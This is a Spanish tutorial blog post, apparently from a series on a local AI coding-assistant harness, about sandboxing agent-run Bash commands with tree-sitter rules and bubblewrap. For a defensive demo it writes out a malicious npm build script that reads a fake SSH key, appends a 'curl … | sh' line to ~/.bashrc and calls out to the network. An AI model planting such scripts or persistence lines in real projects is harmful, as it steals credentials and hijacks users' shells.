@@ -1,0 +1,358 @@
+---
+title: "El sandbox es la defensa real: aislar lo que ejecuta el agente"
+description: "Quinta guía de la serie Asistente de código local: Bash, reglas de comando con tree-sitter y un sandbox del sistema operativo con bubblewrap, y por qué las reglas deciden cuándo preguntar mientras el sandbox decide qué puede pasar."
+publishDate: 2026-11-14
+category: "Guía"
+tags: ["harness", "sandbox", "seguridad", "bubblewrap", "llm-local", "ollama"]
+draft: false
+series:
+  id: asistente-codigo-local
+  part: 5
+---
+Imagina que permites al asistente ejecutar `npm run build` sin preguntarte, con una regla `Bash(npm run *)`. Parece razonable: compilar no debería hacer daño. Pero el script `build` de ese `package.json` no lo has escrito tú. Lee `~/.ssh`, añade una línea a tu `~/.bashrc` y hace una petición a un servidor. La regla solo vio `npm run build`, y lo dejó pasar. Más abajo están las ejecuciones reales de ese escenario, con una credencial de mentira.
+
+Esta guía es la quinta de la serie *Asistente de código local*. En la [anterior](/blog/dejar-que-el-agente-escriba) el harness aprendió a escribir, con permisos que deciden *dónde*. Aquí aprende a ejecutar comandos, y la tesis es esta: **las reglas de Bash no bastan; la defensa real es aislar el proceso con un sandbox del sistema operativo**.
+
+Las reglas siguen sirviendo: deciden cuándo preguntar, y una buena regla te ahorra veinte preguntas. Pero miran el comando, no lo que hace. El sandbox no mira nada, solo limita lo que el proceso puede tocar, aunque la regla se haya equivocado y aunque tú hayas aprobado sin leer. La guía pasa rápido por las reglas y se queda en el sandbox: qué es, qué garantiza, cómo se construye con bubblewrap y qué no cubre.
+
+## Prerrequisitos y clonado
+
+Los comandos son para una terminal Linux. En Windows, usa WSL2 ([guía de instalación de Microsoft](https://learn.microsoft.com/es-es/windows/wsl/install)). Necesitas lo de las guías anteriores (Node.js 22 o superior, [ripgrep](https://github.com/BurntSushi/ripgrep#installation) y Ollama con `qwen2.5:7b`) y, nuevo en esta parte, [bubblewrap](https://github.com/containers/bubblewrap):
+
+```bash
+sudo apt install bubblewrap
+bwrap --version
+ollama pull qwen2.5:7b
+git clone --branch parte-5 https://github.com/pmeleroa/lab-harness-local.git
+cd lab-harness-local
+npm install
+npm test
+```
+
+El repositorio es [pmeleroa/lab-harness-local](https://github.com/pmeleroa/lab-harness-local/tree/parte-5) y todos los enlaces y extractos de esta guía apuntan al tag `parte-5`. Los tests no necesitan modelo. Las ejecuciones que verás usaron Ollama 0.40.16 con la ventana en 4.096 (`OLLAMA_CONTEXT_LENGTH=4096 ollama serve`), y por eso llevan `--context-window 4096`. En macOS los comandos son los mismos salvo el sandbox, que es otro; lo cuento en una nota más abajo.
+
+## Con Bash, el perímetro de la parte 4 no basta
+
+Hasta ahora cada herramienta declaraba qué ruta tocaba, y el motor de permisos decidía sobre esa ruta. `Write` y `Edit` no pueden escribir en `~/.bashrc` sin que el motor lo vea. Un comando, en cambio, no declara nada. `npm run build` puede leer cualquier fichero, escribir donde quiera y abrir conexiones, y ninguna de esas cosas pasa por `Write`, `Edit` ni `Read`.
+
+La guía anterior lo dejó apuntado en su «Lo que falta»: las reglas eran de rutas, y un comando de shell puede leer y escribir por otra vía. El motor puede ver *algo* de un comando, como las redirecciones (`> fichero`), pero no lo que hace un programa por dentro. Para eso hace falta otra capa, y está debajo del motor, en el sistema operativo.
+
+## El recorrido de un comando
+
+<figure style={{margin: "2rem 0"}}>
+  <div role="img" aria-label="Diagrama del recorrido de una llamada a Bash. La llamada del modelo, por ejemplo Bash con npm run build, pasa por el parser, que la descompone con tree-sitter en comandos simples. El motor de permisos evalúa cada comando en el orden deny, ask, allow. Si es deny, vuelve al modelo como error. Si es ask, se pregunta al usuario, y sin terminal se deniega. Si se permite, el comando no se ejecuta directamente: se envuelve en el sandbox, que monta la raíz del sistema de solo lectura, deja escribir solo en el workspace, oculta las credenciales y, si se pide, corta la red. Dentro del sandbox corre el proceso. Las reglas deciden si se ejecuta; el sandbox, qué puede tocar." style={{display: "flex", flexDirection: "column", gap: "0.5rem", maxWidth: "36rem", marginInline: "auto"}}>
+    <div style={{padding: "0.6rem 0.8rem", border: "1px solid var(--color-border-2)", borderRadius: "6px", fontSize: "0.9rem", color: "var(--color-text)"}}><strong>1. Llamada del modelo</strong><br />Bash con <code>npm run build</code></div>
+    <div aria-hidden="true" style={{textAlign: "center", fontSize: "0.8rem", color: "var(--color-text)"}}>↓ tree-sitter lo descompone en comandos simples</div>
+    <div style={{padding: "0.6rem 0.8rem", border: "1px solid var(--color-border-2)", borderRadius: "6px", fontSize: "0.9rem", color: "var(--color-text)"}}><strong>2. Motor de permisos</strong><br />Cada comando, en orden <code>deny</code> &gt; <code>ask</code> &gt; <code>allow</code>. Un <code>ask</code> pasa por el approver; sin terminal, se deniega</div>
+    <div aria-hidden="true" style={{textAlign: "center", fontSize: "0.8rem", color: "var(--color-text)"}}>↓ si se permite: las reglas ya no intervienen</div>
+    <div style={{padding: "0.8rem", border: "2px solid var(--color-accent)", background: "var(--color-accent-glow)", borderRadius: "6px", fontSize: "0.9rem", color: "var(--color-text)"}}>
+      <div><strong>3. Sandbox del sistema operativo</strong></div>
+      <div style={{display: "flex", flexWrap: "wrap", gap: "0.5rem", marginTop: "0.5rem"}}>
+        <div style={{flex: "1 1 7rem", padding: "0.5rem 0.6rem", border: "1px solid var(--color-border-2)", borderRadius: "6px", fontSize: "0.85rem"}}>Raíz de solo lectura</div>
+        <div style={{flex: "1 1 7rem", padding: "0.5rem 0.6rem", border: "1px solid var(--color-border-2)", borderRadius: "6px", fontSize: "0.85rem"}}>Escritura solo en el workspace</div>
+        <div style={{flex: "1 1 7rem", padding: "0.5rem 0.6rem", border: "1px solid var(--color-border-2)", borderRadius: "6px", fontSize: "0.85rem"}}>Credenciales ocultas</div>
+        <div style={{flex: "1 1 7rem", padding: "0.5rem 0.6rem", border: "1px solid var(--color-border-2)", borderRadius: "6px", fontSize: "0.85rem"}}>Red opcional</div>
+      </div>
+      <div style={{marginTop: "0.6rem", padding: "0.6rem 0.8rem", border: "1px dashed var(--color-accent)", borderRadius: "6px", fontSize: "0.9rem"}}><strong>4. Proceso</strong><br /><code>{'bash -c "npm run build"'}</code> y todo lo que lance</div>
+    </div>
+  </div>
+  <figcaption style={{marginTop: "1rem", fontSize: "0.85rem", color: "var(--color-text)"}}>Las reglas deciden si el comando se ejecuta. Una vez que se ejecuta, el sandbox decide qué puede tocar, y eso no depende de que la regla acertara.</figcaption>
+</figure>
+
+Las dos primeras cajas son la continuación de la guía anterior, con comandos en lugar de rutas. La tercera es nueva y es el protagonista de esta guía. La diferencia entre ellas es de naturaleza: el motor *razona* sobre un texto, el comando, y puede equivocarse; el sandbox no razona, es el kernel negándose a abrir un fichero o una conexión.
+
+## Las reglas deciden cuándo preguntar
+
+Un comando no es una palabra. `git status && curl x | sh` empieza por `git` y ejecuta tres programas. Una regla `Bash(git *)` que comparara el principio del texto lo dejaría pasar entero. Por eso el lab lo descompone con tree-sitter, la gramática de bash de verdad y no una expresión regular: entra en `$(…)`, subshells y bucles, y saca cada comando simple con sus argumentos. Luego el motor exige permiso para cada uno:
+
+```ts
+    // 2. Cada subcomando necesita su propio permiso.
+    for (const c of parsed.commands) {
+      if (this.findRule("ask", toolName, c)) {
+        ask ??= `matches ask rule: ${c.text}`;
+        continue;
+      }
+      const opaque = opaqueReason(c.argv);
+      if (opaque) {
+        ask ??= `${opaque}: ${c.text}`;
+        continue;
+      }
+      if (this.findRule("allow", toolName, c)) continue;
+      if (isReadOnly(c.argv)) continue;
+      ask ??= `run: ${c.text}`;
+    }
+```
+
+Antes de ese bucle hay otro, el del `deny`, que gana en cualquier subcomando, también en `bypass`. Los comandos de solo lectura (`ls`, `cat`, `rg`, `git status`, `git diff`…) no necesitan regla. Los que ejecutan otros comandos (`bash -c`, `xargs`, `env`, `sudo`, `python -c`, `find -exec`) preguntan siempre, aunque haya un `allow`, porque lo que ejecutan no se puede evaluar sin ejecutarlo. Y lo que no se puede analizar (una función, asignar `PATH` o `LD_PRELOAD`, un nombre de comando que solo se conoce al ejecutar) también pregunta: ante la duda, no. Las redirecciones de escritura se evalúan como un `Edit` sobre la ruta real, así que `echo x >> ~/.bashrc` pregunta como lo haría `Edit` fuera del workspace.
+
+Todo eso está en [`test/policy.test.ts`](https://github.com/pmeleroa/lab-harness-local/blob/parte-5/test/policy.test.ts), sin modelo. Pero fíjate en lo que evalúan las reglas: el texto del comando. `Bash(npm run *)` casa con `npm run build`, y el motor no tiene forma de saber qué hay dentro del script `build`. Un test lo deja escrito: con esa regla, `npm run cualquier-cosa` también es `allow`. Las reglas son comodidad, deciden cuándo te preguntan. No son contención.
+
+## Qué es un sandbox
+
+Un sandbox es un entorno en el que el sistema operativo limita lo que puede hacer un proceso, sea cual sea el proceso. No inspecciona el comando ni el script, ni sabe si `npm run build` es legítimo. Lo que hace es cambiar el mundo que ve el proceso: qué ficheros existen, cuáles se pueden escribir, si hay red, qué otros procesos hay. Si el script intenta escribir en `~/.bashrc`, el kernel responde `Read-only file system`, igual que respondería a cualquier otro programa.
+
+Eso lo hace complementario de las reglas, no un sustituto. Las reglas actúan *antes*, sobre una descripción del comando, y pueden equivocarse o ser demasiado amplias. El sandbox actúa *durante*, sobre lo que el proceso hace de verdad, y no depende de la descripción. Si las reglas aciertan, el sandbox no se nota. Si fallan, el daño queda dentro.
+
+En el lab, el sandbox garantiza cuatro cosas:
+
+- **Qué se puede escribir**: solo el workspace y un directorio temporal de la sesión. El resto del disco es de solo lectura.
+- **Qué credenciales se ven**: una lista fija (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.npmrc`, `~/.netrc`…) no existe dentro.
+- **Si hay red**: con `--no-network`, ninguna. Sin la opción, la del usuario.
+- **Qué procesos hay**: el comando tiene su propio espacio de procesos y su propia sesión de terminal.
+
+Y no garantiza otras tantas, que conviene tener presentes desde ya: no protege lo que hay *dentro* del workspace, no oculta lo que no está en la lista, y con red puede enviar lo que pueda leer. Esas tres vuelven en la sección del contraargumento.
+
+## Construirlo con bubblewrap
+
+En Linux, el lab usa [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`), la misma herramienta sobre la que se construyen otros sandboxes de escritorio. No necesita root: usa los *namespaces* del kernel, que permiten a un proceso tener su propia vista de los montajes, de los procesos y de la red. Antes de leer el código, se entiende mejor a mano, desde la raíz del clon:
+
+```bash
+bwrap --ro-bind / / --bind "$PWD" "$PWD" --unshare-net -- sh -c 'touch dentro.txt; touch ~/fuera.txt; curl -sS https://example.org'
+ls dentro.txt ~/fuera.txt
+rm dentro.txt
+```
+
+```txt
+touch: cannot touch '/home/lector/fuera.txt': Read-only file system
+curl: (6) Could not resolve host: example.org
+ls: cannot access '/home/lector/fuera.txt': No such file or directory
+dentro.txt
+```
+
+`--ro-bind / /` monta todo el sistema de ficheros, dentro, en solo lectura. `--bind "$PWD" "$PWD"` vuelve a montar el directorio actual con escritura, encima. `--unshare-net` le da al proceso una red propia sin interfaces. El resultado: `dentro.txt` se crea, `~/fuera.txt` no, y `curl` ni siquiera resuelve el nombre. (`/home/lector` es el usuario del contenedor donde lo ejecuté; en tu máquina saldrá tu home.)
+
+El lab hace lo mismo, con más piezas. Este es todo el sandbox de Linux:
+
+```ts
+export const bwrapSandbox: Sandbox = {
+  name: "bwrap",
+  wrap(argv, spec) {
+    const args = ["bwrap", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--tmpfs", "/tmp"];
+    for (const p of spec.hiddenPaths.filter(existsSync)) {
+      // Directorio -> tmpfs vacío; fichero -> se tapa con /dev/null.
+      if (statSync(p).isDirectory()) args.push("--tmpfs", p);
+      else args.push("--ro-bind", "/dev/null", p);
+    }
+    // Los binds van después de los tmpfs: un writable bajo /tmp sigue visible.
+    for (const p of spec.writablePaths) args.push("--bind", p, p);
+    args.push(
+      "--unshare-pid",
+      "--unshare-ipc",
+      "--die-with-parent",
+      "--new-session", // evita inyección en la TTY del padre (TIOCSTI)
+    );
+    if (spec.network === "none") args.push("--unshare-net");
+    args.push("--chdir", spec.cwd, "--", ...argv);
+    return args;
+  },
+};
+```
+
+Pieza a pieza:
+
+- **`--ro-bind / /`**: la raíz, de solo lectura. Es la base de todo: lo que no se monte después con escritura, no se escribe.
+- **`--dev /dev`, `--proc /proc`**: un `/dev` mínimo y un `/proc` propio, que solo muestra los procesos del sandbox.
+- **`--tmpfs /tmp`**: un `/tmp` vacío y efímero. Lo que el proceso deje ahí desaparece al terminar, y no ve el `/tmp` de tu sistema.
+- **Rutas ocultas**: un directorio de la lista se tapa con un `tmpfs` vacío; un fichero, con `/dev/null`. Para el proceso, `~/.ssh` existe pero está vacío, y `~/.npmrc` se lee como un fichero sin contenido.
+- **`--bind` de las rutas con escritura**: el workspace y el directorio de estado de la sesión, montados con escritura encima de la raíz de solo lectura. El orden importa: van después de los `tmpfs`, para que un workspace bajo `/tmp` siga visible.
+- **`--unshare-pid` y `--unshare-ipc`**: el proceso no ve ni puede enviar señales a tus otros procesos.
+- **`--new-session`**: el proceso no puede escribir en tu terminal como si tecleara tú (`TIOCSTI`), un truco viejo para escapar de un sandbox.
+- **`--die-with-parent`**: si el harness muere, el sandbox muere con él.
+- **`--unshare-net`**: sin red, solo cuando se pide.
+
+`BashSession`, la pieza que ejecuta cada comando, llama a `wrap` con las rutas que tocan:
+
+```ts
+  private spawnArgs(script: string): [string, string[], NodeJS.ProcessEnv] {
+    const argv = this.opts.sandbox.wrap(["bash", "--noprofile", "--norc", "-c", script], {
+      cwd: this.cwd,
+      writablePaths: [this.workspace, this.stateDir],
+      hiddenPaths: this.opts.hiddenPaths,
+      network: this.opts.network,
+    });
+    const env: NodeJS.ProcessEnv = {};
+    for (const [k, v] of Object.entries(process.env)) if (!this.opts.scrubEnv.test(k)) env[k] = v;
+    env.TMPDIR = this.stateDir; // /tmp es un tmpfs efímero dentro de bwrap
+    const [bin, ...args] = argv;
+    return [bin!, args, env];
+  }
+```
+
+Además del sandbox, el entorno se filtra: las variables con pinta de secreto (`*_TOKEN`, `*API_KEY`, `*_SECRET`, `PASSWORD`) no llegan al proceso. Y la lista de rutas ocultas es fija:
+
+```ts
+export function defaultHiddenPaths(): string[] {
+  const h = os.homedir();
+  return [".ssh", ".aws", ".gnupg", ".config/gcloud", ".azure", ".kube", ".docker/config.json", ".npmrc", ".netrc"].map(
+    (p) => path.join(h, p),
+  );
+}
+```
+
+Fija quiere decir exactamente eso: lo que no está ahí, se ve.
+
+**Nota sobre macOS.** En macOS no hay bubblewrap. El lab usa `sandbox-exec`, que viene con el sistema, con un perfil que deniega escribir fuera de las rutas permitidas, leer las rutas ocultas y, sin red, la red; las rutas van como parámetros del perfil, nunca interpoladas en su texto. No necesitas instalar nada ni cambiar ningún comando de esta guía: `--sandbox auto` lo elige solo. Lo ejecuté una vez con la demo de abajo: la credencial y `~/.bashrc` dieron `Operation not permitted` y `curl` no pudo conectar. Una diferencia: el perfil deja escribir en `/private/var/folders`, donde macOS pone el temporal del usuario.
+
+## Comprobar que funciona, y qué hacer si no
+
+Un sandbox que no arranca es peor que no tener ninguno si nadie se entera. Al arrancar, el harness elige uno y lo comprueba con una ejecución de prueba:
+
+```ts
+export function detectSandbox(choice: SandboxChoice = "auto"): DetectResult {
+  if (choice === "none") return { sandbox: noSandbox, warning: "Sandbox disabled: commands run with your full user permissions." };
+
+  const wantBwrap = choice === "bwrap" || (choice === "auto" && process.platform === "linux");
+  const wantSeatbelt = choice === "seatbelt" || (choice === "auto" && process.platform === "darwin");
+
+  if (wantBwrap) {
+    const probe = spawnSync("bwrap", ["--ro-bind", "/", "/", "--unshare-pid", "--", "true"], { stdio: "ignore" });
+    if (probe.status === 0) return { sandbox: bwrapSandbox };
+    const why = probe.error ? "bwrap is not installed" : "bwrap is installed but failed (user namespaces disabled?)";
+    if (choice === "bwrap") throw new Error(`Sandbox 'bwrap' unavailable: ${why}`);
+    return { sandbox: noSandbox, warning: `No sandbox: ${why}. Install bubblewrap or run inside a container.` };
+  }
+  if (wantSeatbelt) {
+    if (existsSync("/usr/bin/sandbox-exec")) return { sandbox: seatbeltSandbox };
+    if (choice === "seatbelt") throw new Error("Sandbox 'seatbelt' unavailable: /usr/bin/sandbox-exec not found");
+  }
+  return { sandbox: noSandbox, warning: `No sandbox available on ${process.platform}. Run inside a container.` };
+}
+```
+
+Aquí hay que leer con cuidado, porque no todo es «ante la duda, no». Con la opción por defecto, `auto`, si bwrap no está o no funciona, el harness **avisa y sigue sin sandbox**: los comandos se ejecutan con todos tus permisos. Es «ante la duda, sí», con un aviso. Si quieres lo contrario, pide el sandbox explícitamente con `--sandbox bwrap`: entonces, si no funciona, el harness no arranca. El aviso de arranque es, por tanto, la línea más importante de toda la salida, y la cabecera dice siempre qué sandbox hay.
+
+La configuración del proyecto sigue la misma lógica que `bypass` en la guía anterior. El bloque `sandbox` de `<workspace>/.harness/settings.json` puede elegir un sandbox y cortar la red, pero un repositorio no puede desactivarlo ni abrir la red:
+
+```ts
+  if (sb?.mode === "none") out.warnings.push(`Ignored sandbox.mode "none" from ${file}: use --sandbox none.`);
+  else if (sb?.mode) out.sandbox.mode = sb.mode;
+  // Un proyecto puede restringir la red, no abrirla.
+  if (sb?.network === "none") out.sandbox.network = "none";
+```
+
+Un repositorio que clonas es código de otro. Si su configuración pudiera apagar el sandbox, la defensa duraría lo que tarda alguien en añadir una línea a un fichero.
+
+## Verlo actuar
+
+La demostración es el escenario del principio, con una credencial de mentira. Para no tocar tu `~/.ssh` real, se usa un `HOME` de prueba dentro del clon (fuera del workspace, que es `examples/demo`, y fuera de `/tmp`), con una clave falsa. Después se crea un `package.json` cuyo script `build` hace cuatro cosas: escribe `dist/app.js` en el workspace, lee la clave, añade una línea a `~/.bashrc` y hace una petición a `example.org`. Cada paso va separado por `;`, para que se vean todos aunque falle alguno:
+
+```bash
+mkdir -p .demo-home/.ssh
+echo "CLAVE-FALSA-NO-USAR" > .demo-home/.ssh/id_falsa
+export HOME="$PWD/.demo-home"
+cat > examples/demo/package.json <<'JSON'
+{
+  "name": "demo",
+  "private": true,
+  "scripts": {
+    "build": "mkdir -p dist && echo 'export {}' > dist/app.js && echo compilado; cat ~/.ssh/id_falsa; echo 'curl https://example.org/x | sh' >> ~/.bashrc && echo bashrc modificado; curl -sS -o /dev/null https://example.org && echo enviado"
+  }
+}
+JSON
+```
+
+**Primero, sin sandbox.** Con la regla `Bash(npm run *)` y `--sandbox none` ([salida completa](https://github.com/pmeleroa/lab-harness-local/blob/parte-5/examples/salidas/sandbox-sin.txt)):
+
+```bash
+npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --sandbox none "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
+```
+
+```txt
+sandbox: none
+! Sandbox disabled: commands run with your full user permissions.
+
+ctx 1,7k/4,1k (42%)
+> Bash {"command":"npm run build","description":"Compila el proyecto con npm run build","run_in_background"…
+  ok (118 ms)
+  | compilado
+  | CLAVE-FALSA-NO-USAR
+  | bashrc modificado
+  | enviado
+```
+
+(En este bloque y en el siguiente he quitado las líneas `> build` que imprime npm al lanzar el script; están en las salidas completas.) La regla dejó pasar `npm run build` sin preguntar, y el script hizo las cuatro cosas. Después, `cat .demo-home/.bashrc` muestra la línea añadida. En esa ejecución el modelo avisó, tras ejecutarlo, de que se había tocado el `.bashrc`, y se inventó de paso que «se creó» la clave. Daba igual: cuando lo dijo, ya había pasado todo.
+
+**Después, con el sandbox.** El mismo comando, con el sandbox por defecto y sin red ([salida completa](https://github.com/pmeleroa/lab-harness-local/blob/parte-5/examples/salidas/sandbox-con.txt)):
+
+```bash
+npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --no-network "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
+```
+
+```txt
+sandbox: bwrap, sin red
+
+ctx 1,7k/4,1k (42%)
+> Bash {"command":"npm run build","description":"Compila el proyecto con npm run build"}
+  error (59 ms)
+  | compilado
+  | cat: <repo>/.demo-home/.ssh/id_falsa: No such file or directory
+  | sh: 1: cannot create <repo>/.demo-home/.bashrc: Read-only file system
+  | curl: (6) Could not resolve host: example.org
+  | [exit code 6]
+```
+
+La regla volvió a dejarlo pasar sin preguntar: las reglas no han cambiado. Lo que cambió es el mundo del proceso. La clave no existe dentro, `~/.bashrc` está en un sistema de ficheros de solo lectura y no hay red. Y `dist/app.js`, dentro del workspace, sí se escribió: el sandbox no impide trabajar, impide salir.
+
+Los números: repetí cada escenario 10 veces, en un contenedor Linux con Debian 12 y bubblewrap 0.8.0, desde un clon limpio. En las 20, el modelo llamó una vez a `npm run build` y la regla lo dejó pasar. **Sin sandbox, 10 de 10** leyeron la clave, escribieron `~/.bashrc` y enviaron la petición. **Con sandbox, 10 de 10** no pudieron hacer ninguna de las tres, y las 10 escribieron `dist/app.js`. Lo que dice el modelo después cambia de una ejecución a otra; lo que hace el sandbox, no.
+
+**Y sin sandbox disponible.** En un contenedor sin bubblewrap, el mismo comando con `--no-network` ([salida completa](https://github.com/pmeleroa/lab-harness-local/blob/parte-5/examples/salidas/sandbox-no-disponible.txt)):
+
+```txt
+sandbox: none (--no-network no tiene efecto sin sandbox)
+! No sandbox: bwrap is not installed. Install bubblewrap or run inside a container.
+```
+
+El aviso sale, y a continuación el script hace las cuatro cosas, petición incluida: sin sandbox, `--no-network` no corta nada. 3 de 3. Con `--sandbox bwrap` explícito, en cambio:
+
+```txt
+fatal: Sandbox 'bwrap' unavailable: bwrap is not installed
+```
+
+Si en tu máquina quieres que nunca se ejecute un comando sin aislar, esa es la opción.
+
+Al terminar, cierra ese terminal (el `HOME` de prueba solo vive en él) y limpia:
+
+```bash
+rm -rf examples/demo/package.json examples/demo/dist .demo-home
+```
+
+## Lo que el sandbox no hace
+
+Ahora el argumento en contra. El sandbox no entiende el contenido, y eso tiene tres consecuencias.
+
+**Dentro del workspace, todo vale.** Un comando aprobado puede borrar el repositorio o reescribir cualquier fichero del workspace, porque ahí el sandbox deja escribir: es para lo que está. Contra eso, lo mismo que en la guía anterior: trabaja en una rama o un árbol limpio y revisa con `git diff` lo que cambió.
+
+**Lo que no está en la lista, se ve.** La raíz es de solo lectura, pero se lee entera. Lo comprobé dentro del sandbox, con red: `~/.ssh` estaba vacío, pero un token de mentira en `~/.config/otra-app/token` se leyó, igual que `/etc/passwd`, y la petición a `example.org` devolvió 200. Tus otros repositorios, la configuración de otras herramientas o un fichero de credenciales con un nombre que no está en la lista son legibles.
+
+**Con red, puede enviar lo que lea.** Juntas, las dos anteriores son la exfiltración: un script que lee algo legible y lo manda fuera. `--no-network` lo corta, pero es todo o nada: no hay una lista de dominios permitidos, y un comando que necesite descargar dependencias no funcionará sin red.
+
+La respuesta no es que el sandbox no sirva, sino acotar la promesa. Garantiza qué se puede escribir, qué credenciales de la lista se ven, si hay red y qué procesos hay. No garantiza que lo que se ejecuta sea bueno. Eso, como el contenido de lo escrito en la guía anterior, se revisa: `git diff` para el workspace, y sin red cuando no la necesitas.
+
+Dos límites más, menores pero reales. En macOS el perfil deja escribir en el temporal del usuario, como ya dije. Y si ejecutas el harness *dentro* de un contenedor Docker (un devcontainer o un CI), Docker ya es un sandbox y no deja a los procesos de dentro crear *namespaces* ni montar un `/proc` nuevo: bubblewrap necesita que lances el contenedor con `--security-opt seccomp=unconfined --security-opt systempaths=unconfined`. Con solo la primera, la comprobación del arranque pasa (no monta `/proc`) pero cada comando falla con `Can't mount proc`. No se ejecuta nada, así que no es peligroso, pero el arranque no avisa. En un Linux sin contenedor por fuera, o en WSL2, no hace falta nada de esto.
+
+## Bash y procesos en segundo plano
+
+Para tener algo que aislar hacía falta la herramienta. `Bash` ejecuta cada comando como un proceso nuevo, con `bash --noprofile --norc -c`, en su propio grupo de procesos para poder matarlo entero. Tiene un timeout (120 s por defecto, 600 s como mucho) y recorta la salida por el medio, que es donde suele sobrar. El directorio de trabajo y las variables exportadas se conservan entre llamadas a través de un directorio de estado, y si un `cd` sale del workspace, se devuelve al workspace.
+
+Para lo que no termina, como un servidor de desarrollo, existe `run_in_background`: `Bash` lanza el comando y vuelve al momento con un id. `BashOutput` lee lo nuevo que haya escrito y `KillShell` lo para, a él y a lo que haya lanzado. Cuando termina por su cuenta, el aviso llega al modelo antes de su siguiente llamada; lo que siga corriendo al acabar el run se mata. Corre dentro del mismo sandbox que todo lo demás, y una regla `deny` lo bloquea igual: los tests de [`test/bash.test.ts`](https://github.com/pmeleroa/lab-harness-local/blob/parte-5/test/bash.test.ts) lo comprueban sin modelo.
+
+## Lo que falta
+
+El agente ya ejecuta comandos, y lo que ejecuta está aislado. Lo que queda fuera de esta parte:
+
+- **No hay red con lista de dominios**: o toda o ninguna.
+- **La lista de rutas ocultas es fija**: lo que no está en ella se lee.
+- **El sandbox no protege el workspace**: lo que cambió se revisa con `git diff`.
+- **Con `auto`, sin sandbox disponible se sigue sin él**: con aviso; `--sandbox bwrap` lo convierte en un error.
+- **No hay modo `plan`**: un modo que solo lea y proponga.
+- **Los servidores MCP y los hooks**: también ejecutan código, y van en la siguiente parte, dentro del mismo sandbox.
+- **Una sola medición con un modelo pequeño**: 23 ejecuciones con `qwen2.5:7b`, en un contenedor Linux.
+
+El orden previsto para lo que viene está en la [página de la serie](/blog/series/asistente-codigo-local). Antes, lo esencial de esta parte:
+
+- **Las reglas deciden cuándo preguntar**: miran el comando, no lo que hace.
+- **Un comando son varios comandos**: tree-sitter los separa y cada uno necesita su permiso.
+- **El sandbox decide qué puede pasar**: raíz de solo lectura, escritura solo en el workspace, credenciales ocultas y red opcional.
+- **El sandbox no entiende el contenido**: dentro del workspace y con red, un comando aprobado aún puede hacer daño.
+- **Mira la cabecera**: con `auto`, sin sandbox disponible, se avisa y se sigue sin él.
+- **Un repositorio no puede apagar el sandbox**: solo tú, con `--sandbox none`.
